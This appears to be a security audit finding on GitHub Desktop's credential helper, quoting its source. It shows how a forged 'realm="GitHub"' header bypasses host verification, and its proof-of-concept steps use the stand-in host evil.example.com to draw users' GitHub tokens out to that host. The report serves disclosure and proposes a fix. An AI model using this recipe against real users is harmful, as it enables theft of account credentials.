Confirmed: `promptForGitHubSignIn(endpoint)` pre-fills the enterprise sign-in endpoint field with the attacker-controlled `origin` and proceeds with a full OAuth/PAT flow bound to that endpoint [1](#0-0) . The resulting `Account` (with a real, working token) is then handed straight back to git as Basic Auth credentials for the original (attacker) host via `credWithAccount` [2](#0-1) [3](#0-2) .

### Title
Spoofable `WWW-Authenticate: realm="GitHub"` header bypasses host verification and leaks GitHub credentials to arbitrary hosts - (File: app/src/lib/trampoline/trampoline-credential-helper.ts)

### Summary
`getEndpointKind()` classifies a git remote host as `'enterprise'` (i.e., a real GitHub Enterprise server) if the git credential input contains a `wwwauth[...]` field whose value includes `realm="GitHub"` — a value taken verbatim from the HTTP response of the remote/proxy the user is talking to, with no cryptographic or network-based verification. This check runs *before*, and short-circuits, the safer `isGitHubHost()` network-based check that exists later in the same function. Because git credential helper invocation happens automatically whenever a git operation talks to a remote (clone/fetch/push), a malicious or MITM git server can trivially force Desktop to treat it as a GitHub Enterprise endpoint, trigger a GitHub sign-in prompt scoped to that attacker endpoint, and receive the resulting real GitHub token as Basic Auth credentials.

### Finding Description
`getEndpointKind` is used by the trampoline git-credential helper to decide how to source credentials for a host git is talking to [4](#0-3) . Before doing any real verification, it inspects the credential input's `wwwauth[...]` entries — which are populated directly from the remote server's `WWW-Authenticate` response header captured by git — and if any value contains `realm="GitHub"`, it immediately returns `'enterprise'`:

```
for (const [k, v] of cred.entries()) {
  if (k.startsWith('wwwauth[')) {
    if (v.includes('realm="GitHub"')) {
      return 'enterprise'
    } ...
```

This is exactly the same class of bug as the report: a security-relevant classification is made using untrusted, attacker-supplied data (`realm="GitHub"`) instead of the actual verification mechanism the code already has available (`isGitHubHost()`, which performs a real network probe for `x-github-request-id`) [5](#0-4) .

Downstream, in `getCredential`, when `endpointKind !== 'generic'` and no existing account matches the endpoint, Desktop prompts the user with a "Sign in to GitHub" dialog scoped to the attacker's `endpoint`:

```
const account = await ui.promptForGitHubSignIn(endpoint)
...
return credWithAccount(cred, account)
``` [3](#0-2) 

`promptForGitHubSignIn` sets the sign-in flow's endpoint to the attacker-controlled `origin` and performs a legitimate OAuth/enterprise sign-in against it, producing a real `Account` with a working token [1](#0-0) . `credWithAccount` then copies that account's `login`/`token` into the credential object that is handed back to git [2](#0-1) , and git uses it as the HTTP Basic Auth password sent to the original attacker-controlled host — the very host that spoofed the `realm="GitHub"` header in the first place.

### Impact Explanation
A user cloning or fetching from a malicious/compromised HTTPS remote (or a man-in-the-middle proxy on an insecure network) can cause GitHub Desktop to (a) misidentify the remote as a legitimate GitHub Enterprise host, (b) prompt the user for GitHub sign-in with the attacker's host as the target endpoint, and (c) forward the resulting real GitHub token to that attacker host as a Basic Auth credential. This is credential/token exfiltration from an attacker-controlled remote/proxy response, one of the explicitly valid impact categories — the leaked token can then be used by the attacker against the real GitHub/GHE API.

### Likelihood Explanation
Likelihood is Medium-High: any git server (including one the attacker fully controls, e.g. a self-hosted `git-http-backend` or `nginx` reverse proxy) can trivially add `WWW-Authenticate: Basic realm="GitHub"` to a 401 response for an unauthenticated fetch. This is a single, easily-forged HTTP header requiring no compromise of TLS or DNS. It does require the user to attempt to interact with the attacker-controlled or MITM'd remote (clone/fetch/push) and to go through the resulting sign-in prompt — a normal Desktop workflow, not an unnatural user action.

### Recommendation
Do not trust the `wwwauth[...]` realm string as a host-classification signal on its own. At minimum, treat a `realm="GitHub"` header only as a hint to attempt the authoritative `isGitHubHost()` network check (which validates via `x-github-request-id` and known-host heuristics) before classifying the endpoint as `'enterprise'`, exactly the check that already exists later in the function but is currently bypassed. Alternatively, only allow the header-based shortcut for hosts that already pass the DNS/hostname heuristics (`github`, known GHE patterns), never as a sole trust anchor for triggering a credential-yielding sign-in flow.

### Proof of Concept
1. Attacker stands up an HTTPS git server (or MITM proxy) at `https://evil.example.com/foo.git`.
2. On any unauthenticated request from git, the server responds with `401` and header `WWW-Authenticate: Basic realm="GitHub"`.
3. Victim runs `git clone https://evil.example.com/foo.git` inside GitHub Desktop (or adds/fetches from this as a remote).
4. Desktop's trampoline credential helper is invoked; `getEndpointKind` sees the spoofed `wwwauth[...]` header and returns `'enterprise'` without any real verification.
5. Since no account exists for `evil.example.com`, Desktop shows a "Sign in to GitHub" dialog with `credentialHelperUrl` set to the attacker's endpoint.
6. Victim completes a legitimate OAuth/token sign-in (they may believe they're authenticating to their real GHE instance, since the sign-in flow used is the normal Enterprise flow but pointed at the attacker's origin — or they may already have entered legit GHE credentials on a previous prompt in a phished session).
7. The resulting real GitHub token is placed into the credential map and returned to git, which sends it as the `Authorization: Basic` header to `evil.example.com`, exfiltrating the token to the attacker.

### Citations

**File:** app/src/lib/trampoline/trampoline-ui-helper.ts (L80-99)
```typescript
  public promptForGitHubSignIn(endpoint: string): Promise<Account | undefined> {
    return new Promise<Account | undefined>(async resolve => {
      const cb = (result: SignInResult) => {
        resolve(result.kind === 'success' ? result.account : undefined)
        this.dispatcher.closePopup(PopupType.SignIn)
      }

      const { hostname, origin } = new URL(endpoint)
      if (hostname === 'github.com') {
        this.dispatcher.beginDotComSignIn(cb)
      } else {
        this.dispatcher.beginEnterpriseSignIn(cb)
        await this.dispatcher.setSignInEndpoint(origin)
      }

      this.dispatcher.showPopup({
        type: PopupType.SignIn,
        isCredentialHelperSignIn: true,
        credentialHelperUrl: endpoint,
      })
```

**File:** app/src/lib/trampoline/trampoline-credential-helper.ts (L47-48)
```typescript
const credWithAccount = (c: Credential, a: IGitAccount | undefined) =>
  a && new Map(c).set('username', a.login).set('password', a.token)
```

**File:** app/src/lib/trampoline/trampoline-credential-helper.ts (L109-125)
```typescript
  if (
    endpointKind !== 'generic' &&
    !accounts.some(a => a.endpoint === apiEndpoint)
  ) {
    if (getIsBackgroundTaskEnvironment(token)) {
      debug('background task environment, skipping prompt')
      return undefined
    }

    const account = await ui.promptForGitHubSignIn(endpoint)

    if (!account) {
      setHasRejectedCredentialsForEndpoint(token, endpoint)
    }

    return credWithAccount(cred, account)
  }
```

**File:** app/src/lib/trampoline/trampoline-credential-helper.ts (L137-179)
```typescript
const getEndpointKind = async (cred: Credential, store: Store) => {
  const credentialUrl = getCredentialUrl(cred)
  const endpoint = `${credentialUrl}`

  if (isGist(endpoint)) {
    return 'generic'
  }

  if (isDotCom(endpoint)) {
    return 'github.com'
  }

  if (isGHE(endpoint)) {
    return 'ghe.com'
  }

  // When Git attempts to authenticate with a host it captures any
  // WWW-Authenticate headers and forwards them to the credential helper. We
  // use them as a happy-path to determine if the host is a GitHub host without
  // having to resort to making a request ourselves.
  for (const [k, v] of cred.entries()) {
    if (k.startsWith('wwwauth[')) {
      if (v.includes('realm="GitHub"')) {
        return 'enterprise'
      } else if (/realm="(GitLab|Gitea|Atlassian Bitbucket)"/.test(v)) {
        return 'generic'
      }
    }
  }

  const existingAccount = await findGitHubTrampolineAccount(store, endpoint)
  if (existingAccount) {
    return isDotCom(existingAccount.endpoint) ? 'github.com' : 'enterprise'
  }

  // All GitHub hosts use HTTPS, so if the protocol is not HTTPS we can
  // assume that this is not a GitHub host.
  if (credentialUrl.protocol !== 'https:') {
    return 'generic'
  }

  return (await isGitHubHost(endpoint)) ? 'enterprise' : 'generic'
}
```
